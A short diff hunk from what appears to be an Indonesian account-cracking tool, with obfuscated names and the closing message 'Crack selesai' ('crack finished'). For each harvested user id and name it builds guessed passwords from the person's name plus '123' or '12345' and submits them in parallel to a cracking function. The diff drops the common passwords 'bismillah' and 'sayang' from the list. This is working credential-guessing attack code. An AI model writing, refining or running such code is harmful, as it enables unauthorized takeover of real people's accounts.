@@ -1145,9 +1145,9 @@ def peweh():
                 uid, name = yntkts.split('|')
                 xz = name.split(' ')
                 if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                    pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", "bismillah", "sayang"]
+                    pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345"]
                 else:
-                    pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", "bismillah", "sayang"]
+                    pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345"]
                 __yayanXD__.submit(crack2, uid, pwx)
             except: pass
     exit(f"\n {N}[{H}#{N}] Crack selesai...")
